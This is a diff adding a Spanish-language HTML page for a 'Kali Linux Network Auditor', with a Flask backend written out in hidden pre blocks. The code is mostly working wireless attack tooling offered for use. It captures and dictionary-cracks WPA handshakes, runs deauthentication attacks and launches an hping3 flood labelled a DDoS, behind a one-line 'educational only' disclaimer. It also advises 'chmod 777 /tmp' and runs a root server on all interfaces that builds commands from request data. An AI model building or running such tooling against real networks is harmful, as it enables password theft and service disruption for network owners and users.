@@ -1,0 +1,933 @@
+<html><head><base href="." />
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Auditor de Redes Kali Linux con Backend Python</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg-dark: #0a0a0a;
+  --text-light: #e0e0e0;
+  --accent: #00ff9d;
+  --terminal-bg: #000000;
+  --gradient: linear-gradient(45deg, #00ff9d, #00b8ff);
+}
+
+body {
+  background: var(--bg-dark);
+  color: var(--text-light);
+  font-family: 'JetBrains Mono', 'Courier New', monospace;
+  margin: 0;
+  padding: 20px;
+  line-height: 1.6;
+}
+
+.container {
+  max-width: 1000px;
+  margin: 0 auto;
+}
+
+h1 {
+  background: var(--gradient);
+  -webkit-background-clip: text;
+  background-clip: text;
+  color: transparent;
+  font-size: 2.5em;
+  margin-bottom: 1.5em;
+  text-align: center;
+  text-transform: uppercase;
+  letter-spacing: 2px;
+}
+
+.terminal {
+  background: rgba(0, 0, 0, 0.8);
+  border: 1px solid var(--accent);
+  border-radius: 10px;
+  padding: 20px;
+  margin: 20px 0;
+  height: 300px;
+  overflow-y: auto;
+  font-size: 14px;
+  box-shadow: 0 0 20px rgba(0, 255, 157, 0.1);
+  backdrop-filter: blur(5px);
+}
+
+.terminal-output {
+  color: var(--accent);
+  white-space: pre-wrap;
+}
+
+.button-group {
+  display: flex;
+  gap: 15px;
+  margin: 20px 0;
+  flex-wrap: wrap;
+  justify-content: center;
+}
+
+button {
+  background: transparent;
+  border: 2px solid var(--accent);
+  color: var(--accent);
+  padding: 12px 24px;
+  cursor: pointer;
+  border-radius: 25px;
+  transition: all 0.3s ease;
+  font-weight: bold;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  font-size: 0.9em;
+}
+
+button:hover {
+  background: var(--gradient);
+  border-color: transparent;
+  color: var(--bg-dark);
+  transform: translateY(-2px);
+  box-shadow: 0 5px 15px rgba(0, 255, 157, 0.2);
+}
+
+select {
+  background: rgba(0, 0, 0, 0.8);
+  border: 2px solid var(--accent);
+  color: var(--accent);
+  padding: 12px 24px;
+  border-radius: 25px;
+  margin-right: 10px;
+  cursor: pointer;
+  font-weight: bold;
+  letter-spacing: 1px;
+  transition: all 0.3s ease;
+}
+
+select:hover {
+  box-shadow: 0 0 15px rgba(0, 255, 157, 0.2);
+}
+
+select option {
+  background: var(--bg-dark);
+  color: var(--accent);
+  padding: 10px;
+}
+
+.network-list {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+  gap: 20px;
+  padding: 20px;
+}
+
+.network-item {
+  background: rgba(0, 0, 0, 0.6);
+  border: 1px solid var(--accent);
+  border-radius: 10px;
+  padding: 25px;
+  position: relative;
+  overflow: hidden;
+  transition: all 0.3s ease;
+  display: flex;
+  flex-direction: column;
+  gap: 10px;
+}
+
+.network-item:hover {
+  transform: translateY(-5px);
+  box-shadow: 0 10px 20px rgba(0, 255, 157, 0.2);
+  background: rgba(0, 0, 0, 0.8);
+}
+
+.network-item::before {
+  content: '';
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 4px;
+  background: var(--gradient);
+}
+
+.network-item div {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+
+.network-item div::before {
+  content: '•';
+  color: var(--accent);
+  font-size: 1.5em;
+}
+
+.network-item .ssid {
+  font-size: 1.2em;
+  font-weight: bold;
+  color: var(--accent);
+}
+
+.network-item .button-group {
+  margin-top: 15px;
+  opacity: 1;
+  transform: none;
+  justify-content: flex-start;
+}
+
+.network-item .button-group button {
+  padding: 8px 16px;
+  font-size: 0.8em;
+}
+
+.network-strength {
+  position: absolute;
+  top: 20px;
+  right: 20px;
+  width: 30px;
+  height: 30px;
+}
+
+.network-strength svg {
+  width: 100%;
+  height: 100%;
+  fill: var(--accent);
+}
+
+.loading {
+  color: var(--accent);
+  margin: 10px 0;
+  animation: pulse 1.5s infinite;
+}
+
+@keyframes pulse {
+  0% { opacity: 1; }
+  50% { opacity: 0.3; }
+  100% { opacity: 1; }
+}
+
+/* Custom scrollbar */
+::-webkit-scrollbar {
+  width: 8px;
+}
+
+::-webkit-scrollbar-track {
+  background: rgba(0, 0, 0, 0.3);
+  border-radius: 4px;
+}
+
+::-webkit-scrollbar-thumb {
+  background: var(--accent);
+  border-radius: 4px;
+}
+
+::-webkit-scrollbar-thumb:hover {
+  background: #00b8ff;
+}
+
+/* Add hover effect to network items */
+.network-item .button-group {
+  opacity: 0;
+  transform: translateY(10px);
+  transition: all 0.3s ease;
+}
+
+.network-item:hover .button-group {
+  opacity: 1;
+  transform: translateY(0);
+}
+
+/* Add subtle glow effect to terminal */
+.terminal::before {
+  content: '';
+  position: absolute;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  border-radius: 10px;
+  background: var(--gradient);
+  opacity: 0.1;
+  z-index: -1;
+  filter: blur(20px);
+}
+
+/* Scan animation styles */
+.scan-animation {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
+}
+
+.scan-spinner {
+  width: 50px;
+  height: 50px;
+  border: 3px solid transparent;
+  border-top: 3px solid var(--accent);
+  border-right: 3px solid var(--accent);
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+}
+
+.scan-wave {
+  position: relative;
+  width: 100px;
+  height: 100px;
+  margin: 20px;
+}
+
+.scan-wave::before,
+.scan-wave::after {
+  content: '';
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  width: 100%;
+  height: 100%;
+  border: 2px solid var(--accent);
+  border-radius: 50%;
+  animation: wave 2s ease-out infinite;
+}
+
+.scan-wave::after {
+  animation-delay: 1s;
+}
+
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+
+@keyframes wave {
+  0% {
+    width: 0;
+    height: 0;
+    opacity: 1;
+  }
+  100% {
+    width: 100px;
+    height: 100px;
+    opacity: 0;
+  }
+}
+
+.scan-status {
+  color: var(--accent);
+  text-align: center;
+  margin-top: 10px;
+  font-size: 1.2em;
+  animation: pulse 1.5s infinite;
+}
+</style>
+</head>
+<body>
+
+<div class="container">
+  <h1>Kali Linux Network Auditor</h1>
+  
+  <div class="button-group">
+    <button onclick="getInterfaces()">Obtener Interfaces</button>
+    <select id="interface-select" onchange="updateSelectedInterface()">
+      <option value="">Seleccionar Interface</option>
+    </select>
+    <button onclick="enableMonitorMode()">Activar Modo Monitor</button>
+    <button onclick="disableMonitorMode()">Desactivar Modo Monitor</button>
+    <button onclick="restoreInterface()">Restaurar Interface</button>
+    <button onclick="scanNetworks()">Escanear Redes</button>
+    <button onclick="auditor.clearTerminal()">Limpiar Terminal</button>
+  </div>
+
+  <div class="terminal">
+    <div id="terminal-output" class="terminal-output"></div>
+  </div>
+
+  <div id="network-list" class="network-list"></div>
+</div>
+
+<script>
+class NetworkAuditor {
+  constructor() {
+    this.currentInterface = null;
+    this.networks = [];
+    this.terminalOutput = document.getElementById('terminal-output');
+    this.networkList = document.getElementById('network-list');
+    this.interfaceSelect = document.getElementById('interface-select');
+  }
+
+  async updateInterface(interfaceName) {
+    this.currentInterface = interfaceName;
+    this.log(`Selected interface: ${interfaceName}`);
+    const response = await fetch('/api/select_interface', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({interface: interfaceName})
+    });
+    const result = await response.json();
+    this.log(result.message);
+  }
+
+  async getInterfaces() {
+    this.log('Getting network interfaces...');
+    try {
+      const response = await fetch('/api/get_interfaces');
+      const interfaces = await response.json();
+      this.interfaceSelect.innerHTML = '<option value="">Seleccionar Interface</option>';
+      interfaces.forEach(iface => {
+        const option = document.createElement('option');
+        option.value = iface.name;
+        option.textContent = `${iface.name} (${iface.type})`;
+        this.interfaceSelect.appendChild(option);
+      });
+      this.log('Interfaces retrieved successfully');
+    } catch (error) {
+      this.log('Error getting interfaces: ' + error.message);
+    }
+  }
+
+  async enableMonitorMode() {
+    if (!this.currentInterface) {
+      this.log('Please select an interface first');
+      return;
+    }
+    
+    this.log(`Enabling monitor mode on ${this.currentInterface}`);
+    try {
+      const response = await fetch('/api/enable_monitor', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({interface: this.currentInterface})
+      });
+      const result = await response.json();
+      this.log(result.message);
+    } catch (error) {
+      this.log('Error enabling monitor mode: ' + error.message);
+    }
+  }
+
+  async disableMonitorMode() {
+    if (!this.currentInterface) {
+      this.log('Please select an interface first');
+      return;
+    }
+
+    try {
+      const response = await fetch('/api/disable_monitor', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({interface: this.currentInterface})
+      });
+      const result = await response.json();
+      this.log(result.message);
+    } catch (error) {
+      this.log('Error disabling monitor mode: ' + error.message);
+    }
+  }
+
+  async scanNetworks() {
+    if (!this.currentInterface) {
+      this.log('Please select an interface first');
+      return;
+    }
+
+    this.log('Scanning for networks...');
+    
+    // Clear existing networks and show animation
+    this.networkList.innerHTML = `
+      <div class="scan-animation">
+        <div class="scan-wave"></div>
+        <div class="scan-spinner"></div>
+      </div>
+      <div class="scan-status">Scanning for networks...</div>
+    `;
+
+    try {
+      const response = await fetch('/api/scan_networks', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({interface: this.currentInterface})
+      });
+      
+      // Add a minimum delay to show the animation
+      await new Promise(resolve => setTimeout(resolve, 2000));
+      
+      this.networks = await response.json();
+      this.displayNetworks();
+      this.log('Network scan complete');
+    } catch (error) {
+      this.log('Error scanning networks: ' + error.message);
+      this.networkList.innerHTML = `
+        <div style="color: var(--accent); text-align: center; padding: 20px;">
+          Error scanning networks. Please try again.
+        </div>
+      `;
+    }
+  }
+
+  clearTerminal() {
+    this.terminalOutput.innerHTML = '';
+    this.log('Terminal limpiada');
+  }
+
+  async captureHandshake(network) {
+    if (!this.currentInterface) {
+      this.log('Please select an interface first');
+      return;
+    }
+
+    this.log(`Starting capture on network: ${network.ssid}`);
+    try {
+      const response = await fetch('/api/capture_handshake', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          interface: this.currentInterface,
+          bssid: network.bssid,
+          channel: network.channel
+        })
+      });
+      const result = await response.json();
+      this.log(result.message);
+    } catch (error) {
+      this.log('Error capturing handshake: ' + error.message);
+    }
+  }
+
+  async deauthNetwork(network) {
+    if (!this.currentInterface) {
+      this.log('Please select an interface first');
+      return;
+    }
+
+    this.log(`Deauthenticating devices on network: ${network.ssid}`);
+    try {
+      const response = await fetch('/api/deauth_network', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          interface: this.currentInterface,
+          bssid: network.bssid
+        })
+      });
+      const result = await response.json();
+      this.log(result.message);
+    } catch (error) {
+      this.log('Error deauthenticating network: ' + error.message);
+    }
+  }
+
+  async ddosNetwork(network) {
+    if (!this.currentInterface) {
+      this.log('Por favor seleccione una interfaz primero');
+      return;
+    }
+
+    this.log(`Iniciando ataque DDoS en la red: ${network.ssid}`);
+    try {
+      const response = await fetch('/api/ddos_attack', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          interface: this.currentInterface,
+          bssid: network.bssid
+        })
+      });
+      const result = await response.json();
+      this.log(result.message);
+    } catch (error) {
+      this.log('Error en ataque DDoS: ' + error.message);
+    }
+  }
+
+  displayNetworks() {
+    this.networkList.innerHTML = '';
+    this.networks.forEach(network => {
+      const networkDiv = document.createElement('div');
+      networkDiv.className = 'network-item';
+      
+      const signalStrengthSVG = `
+        <div class="network-strength">
+          <svg viewBox="0 0 24 24">
+            <path d="M12,3L2,12h3v8h6v-6h2v6h6v-8h3L12,3z"/>
+          </svg>
+        </div>
+      `;
+      
+      networkDiv.innerHTML = `
+        ${signalStrengthSVG}
+        <div class="ssid">${network.ssid || 'Red Oculta'}</div>
+        <div class="bssid">BSSID: ${network.bssid}</div>
+        <div class="channel">Canal: ${network.channel}</div>
+        <div class="frequency">Frecuencia: ${network.frequency} GHz</div>
+        <div class="button-group">
+          <button onclick="auditor.captureHandshake({
+            ssid: '${network.ssid}',
+            bssid: '${network.bssid}',
+            channel: '${network.channel}',
+            frequency: '${network.frequency}'
+          })">
+            <svg viewBox="0 0 24 24" width="16" height="16" style="vertical-align: middle; margin-right: 5px;">
+              <path fill="currentColor" d="M12,3L2,12h3v8h6v-6h2v6h6v-8h3L12,3z"/>
+            </svg>
+            Capturar Handshake
+          </button>
+          <button onclick="auditor.deauthNetwork({
+            ssid: '${network.ssid}',
+            bssid: '${network.bssid}',
+            channel: '${network.channel}',
+            frequency: '${network.frequency}'
+          })">
+            <svg viewBox="0 0 24 24" width="16" height="16" style="vertical-align: middle; margin-right: 5px;">
+              <path fill="currentColor" d="M12,2C6.47,2,2,6.47,2,12s4.47,10,10,10s10-4.47,10-10S17.53,2,12,2z M17,15.59L15.59,17L12,13.41L8.41,17L7,15.59L10.59,12L7,8.41L8.41,7L12,10.59L15.59,7L17,8.41L13.41,12L17,15.59z"/>
+            </svg>
+            Desautenticar
+          </button>
+          <button onclick="auditor.ddosNetwork({
+            ssid: '${network.ssid}',
+            bssid: '${network.bssid}'
+          })">
+            <svg viewBox="0 0 24 24" width="16" height="16" style="vertical-align: middle; margin-right: 5px;">
+              <path fill="currentColor" d="M9,5v2h6.59L4,18.59L5.41,20L17,8.41V15h2V5H9z"/>
+            </svg>
+            Ataque DDoS
+          </button>
+        </div>
+      `;
+      this.networkList.appendChild(networkDiv);
+    });
+  }
+
+  log(message) {
+    this.terminalOutput.innerHTML += message + '\n';
+    this.terminalOutput.scrollTop = this.terminalOutput.scrollHeight;
+  }
+}
+
+const auditor = new NetworkAuditor();
+
+function updateSelectedInterface() {
+  const selectedInterface = document.getElementById('interface-select').value;
+  if (selectedInterface) {
+    auditor.updateInterface(selectedInterface);
+  }
+}
+
+function getInterfaces() {
+  auditor.getInterfaces();
+}
+
+function enableMonitorMode() {
+  auditor.enableMonitorMode();
+}
+
+function disableMonitorMode() {
+  auditor.disableMonitorMode();
+}
+
+function restoreInterface() {
+  auditor.disableMonitorMode();
+}
+
+function scanNetworks() {
+  auditor.scanNetworks();
+}
+</script>
+
+<pre style="display: none;">
+# network_utils.py
+import subprocess
+
+def get_wireless_interfaces():
+    """Get all wireless network interfaces"""
+    try:
+        cmd = "iwconfig"
+        output = subprocess.check_output(cmd.split(), stderr=subprocess.STDOUT).decode()
+        interfaces = []
+        for line in output.split('\n'):
+            if 'IEEE 802.11' in line:
+                iface = line.split()[0]
+                interfaces.append({'name': iface, 'type': 'IEEE 802.11'})
+        return interfaces
+    except Exception as e:
+        raise Exception(f"Error getting interfaces: {str(e)}")
+
+def set_monitor_mode(interface, enable=True):
+    """Enable or disable monitor mode for a given interface"""
+    try:
+        cmd = f"airmon-ng {'start' if enable else 'stop'} {interface}"
+        output = subprocess.check_output(cmd.split(), stderr=subprocess.STDOUT).decode()
+        return output
+    except Exception as e:
+        raise Exception(f"Error setting monitor mode: {str(e)}")
+
+def scan_wifi_networks(interface):
+    """Scan for available WiFi networks"""
+    try:
+        cmd = f"airodump-ng {interface} --output-format csv --write /tmp/scan"
+        process = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        import time
+        time.sleep(10)  # Scan for 10 seconds
+        process.terminate()
+        
+        networks = []
+        with open('/tmp/scan-01.csv', 'r') as f:
+            lines = f.readlines()
+            for line in lines[2:]:  # Skip header lines
+                if line.strip():
+                    parts = line.split(',')
+                    if len(parts) > 13:
+                        networks.append({
+                            'bssid': parts[0].strip(),
+                            'channel': parts[3].strip(),
+                            'frequency': parts[4].strip(),
+                            'ssid': parts[13].strip()
+                        })
+        
+        import os
+        os.remove('/tmp/scan-01.csv')
+        return networks
+    except Exception as e:
+        raise Exception(f"Error scanning networks: {str(e)}")
+</pre>
+
+<pre style="display: none;">
+# attack_utils.py
+import subprocess
+import time
+import os
+import glob
+
+def capture_handshake(interface, bssid, channel):
+    """Capture WPA handshake for a specific network"""
+    try:
+        capture_file = f"/tmp/capture-{bssid.replace(':', '')}"
+        cmd = f"airodump-ng --bssid {bssid} -c {channel} -w {capture_file} {interface}"
+        process = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        
+        time.sleep(30)  # Capture for 30 seconds
+        process.terminate()
+        
+        # Attempt to crack the captured handshake
+        cap_file = f"{capture_file}-01.cap"
+        cmd = f"aircrack-ng {cap_file} -w /usr/share/wordlists/rockyou.txt"
+        output = subprocess.check_output(cmd.split(), stderr=subprocess.STDOUT).decode()
+        
+        # Clean up capture files
+        for f in glob.glob(f"{capture_file}*"):
+            os.remove(f)
+            
+        return output
+    except Exception as e:
+        raise Exception(f"Error al capturar handshake: {str(e)}")
+
+def deauth_attack(interface, bssid):
+    """Perform deauth attack on a specific network"""
+    try:
+        cmd = f"aireplay-ng --deauth 10 -a {bssid} {interface}"
+        output = subprocess.check_output(cmd.split(), stderr=subprocess.STDOUT).decode()
+        return output
+    except Exception as e:
+        raise Exception(f"Error performing deauth attack: {str(e)}")
+
+def ddos_attack(interface, bssid, packets=1000):
+    """Perform DDoS attack on a specific network"""
+    try:
+        cmd = f"hping3 -c {packets} -d 120 -S -w 64 -p 80 --flood --rand-source {bssid}"
+        process = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        time.sleep(10)  # Run for 10 seconds
+        process.terminate()
+        return "Ataque DDoS completado"
+    except Exception as e:
+        raise Exception(f"Error durante el ataque DDoS: {str(e)}")
+</pre>
+
+<pre style="display: none;">
+# app.py
+from flask import Flask, jsonify, request
+from network_utils import get_wireless_interfaces, set_monitor_mode, scan_wifi_networks
+from attack_utils import capture_handshake, deauth_attack, ddos_attack
+
+app = Flask(__name__)
+
+@app.route('/api/get_interfaces')
+def get_interfaces():
+    """API endpoint to get wireless interfaces"""
+    try:
+        interfaces = get_wireless_interfaces()
+        return jsonify(interfaces)
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/enable_monitor', methods=['POST'])
+def enable_monitor():
+    """API endpoint to enable monitor mode"""
+    try:
+        data = request.json
+        interface = data['interface']
+        output = set_monitor_mode(interface, enable=True)
+        return jsonify({'message': f'Modo monitor activado en {interface}\n{output}'})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/disable_monitor', methods=['POST'])
+def disable_monitor():
+    """API endpoint to disable monitor mode"""
+    try:
+        data = request.json
+        interface = data['interface']
+        output = set_monitor_mode(interface, enable=False)
+        return jsonify({'message': f'Modo monitor desactivado en {interface}\n{output}'})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/scan_networks', methods=['POST'])
+def scan_networks():
+    """API endpoint to scan for WiFi networks"""
+    try:
+        data = request.json
+        interface = data['interface']
+        networks = scan_wifi_networks(interface)
+        return jsonify(networks)
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/capture_handshake', methods=['POST'])
+def capture_handshake_route():
+    """API endpoint to capture WPA handshake"""
+    try:
+        data = request.json
+        output = capture_handshake(
+            data['interface'],
+            data['bssid'],
+            data['channel']
+        )
+        return jsonify({'message': f'Captura completada. Resultados:\n{output}'})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/deauth_network', methods=['POST'])
+def deauth_network():
+    """API endpoint to perform deauth attack"""
+    try:
+        data = request.json
+        output = deauth_attack(data['interface'], data['bssid'])
+        return jsonify({'message': f'Ataque de desautenticación completado\n{output}'})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/ddos_attack', methods=['POST'])
+def ddos_network():
+    """API endpoint to perform DDoS attack"""
+    try:
+        data = request.json
+        output = ddos_attack(data['interface'], data['bssid'])
+        return jsonify({'message': f'Ataque DDoS completado\n{output}'})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
+</pre>
+
+<pre style="display: none;">
+# Save the Python code as app.py
+# Install required dependencies:
+pip install flask
+
+# Run the Flask application:
+python app.py
+
+# Make sure you have the following Kali Linux tools installed:
+# - aircrack-ng
+# - airodump-ng
+# - aireplay-ng
+# - iwconfig
+# - hping3
+
+# Note: This application requires root privileges to run properly
+# Run with: sudo python app.py
+</pre>
+
+<h2>Requisitos Previos</h2>
+<ul>
+  <li>Sistema Operativo Kali Linux</li>
+  <li>Python 3.x</li>
+  <li>Paquetes necesarios:
+    <ul>
+      <li>Flask</li>
+      <li>Suite aircrack-ng</li>
+      <li>hping3 (para ataques DDoS)</li>
+    </ul>
+  </li>
+</ul>
+
+<h2>Instalación</h2>
+<ol>
+  <li>Instalar paquetes Python requeridos:</li>
+  <pre>pip install flask</pre>
+  <li>Instalar herramientas de Kali Linux necesarias:</li>
+  <pre>
+# Instalar suite aircrack-ng y hping3
+sudo apt install aircrack-ng hping3
+</pre>
+</ol>
+
+<h2>Uso</h2>
+<ol>
+  <li>Clonar el repositorio</li>
+  <li>Navegar al directorio del proyecto</li>
+  <li>Ejecutar la aplicación con privilegios de root:</li>
+  <pre>sudo python app.py</pre>
+  <li>Abrir un navegador web y navegar a:</li>
+  <pre>http://localhost:5000</pre>
+</ol>
+
+<h2>Características</h2>
+<ul>
+  <li>Listar interfaces inalámbricas</li>
+  <li>Activar/desactivar modo monitor</li>
+  <li>Escanear redes inalámbricas</li>
+  <li>Capturar handshakes WPA</li>
+  <li>Realizar ataques de desautenticación</li>
+  <li>Realizar ataques DDoS</li>
+  <li>Crackeo de contraseñas usando diccionario rockyou</li>
+</ul>
+
+<h2>Aviso de Seguridad</h2>
+<p>Esta herramienta es solo para fines educativos. Úsela solo en redes que sean de su propiedad o tenga permiso explícito para probar.</p>
+
+<div class="documentation" style="margin-top: 20px; padding: 20px; border: 1px solid var(--accent);">
+  <h3>Solución de Problemas en Captura de Handshake</h3>
+  <p>Si encuentras problemas con la captura de handshake, verifica lo siguiente:</p>
+  <ol>
+    <li>Asegúrate que tu adaptador inalámbrico soporte inyección de paquetes
+      <pre>sudo aireplay-ng -9 [interface]</pre>
+    </li>
+    <li>Verifica que el modo monitor esté correctamente activado
+      <pre>iwconfig [interface]</pre>
+      Debería mostrar "Mode:Monitor"
+    </li>
+    <li>Revisa los permisos del directorio de captura
+      <pre>sudo chmod 777 /tmp</pre>
+    </li>
+    <li>Verifica que airodump-ng esté capturando paquetes
+      <pre>sudo airodump-ng [interface] --bssid [target_bssid] -c [channel] -w capture</pre>
+    </li>
+    <li>Asegúrate que el diccionario rockyou.txt esté presente y extraído
+      <pre>sudo gunzip /usr/share/wordlists/rockyou.txt.gz</pre>
+    </li>
+  </ol>
+  
+  <h4>Soluciones a Errores Comunes:</h4>
+  <ul>
+    <li>Interfaz no encontrada: Reiniciar servicio NetworkManager
+      <pre>sudo service NetworkManager restart</pre>
+    </li>
+    <li>Permiso denegado: Ejecutar con privilegios sudo
+      <pre>sudo python app.py</pre>
+    </li>
+    <li>Fallo en modo monitor: Resetear interfaz
+      <pre>sudo airmon-ng check kill
+sudo airmon-ng start [interface]</pre>
+    </li>
+  </ul>
+</div>
+
+</body>
+</html>
